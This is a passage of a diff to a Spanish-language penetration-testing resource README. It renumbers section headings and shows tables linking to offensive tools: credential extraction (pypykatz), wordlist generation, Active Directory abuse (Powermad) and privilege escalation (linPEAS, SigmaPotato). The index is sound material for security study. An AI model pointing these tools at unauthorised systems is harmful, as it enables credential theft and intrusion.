 | pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |
 
-###  13.6. <a name='wordlists'></a>Wordlists
+###  14.6. <a name='wordlists'></a>Wordlists
 
 | Nombre                        | URL                                                                                                                |
 | ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
@@ -6016,13 +6172,13 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-###  13.7. <a name='active-directory-1'></a>Active Directory
+###  14.7. <a name='active-directory-1'></a>Active Directory
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
 | Powermad | https://github.com/Kevin-Robertson/Powermad              |
 
-###  13.8. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
+###  14.8. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
@@ -6031,7 +6187,7 @@ Enlaces a las distintas herramientas y recursos.
 | Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
 | SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |
 
-###  13.9. <a name='recursos-y-blogs'></a>Recursos y Blogs
+###  14.9. <a name='recursos-y-blogs'></a>Recursos y Blogs
 
 | Nombre                                                  | URL                                                                                                                                                                          |
 | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
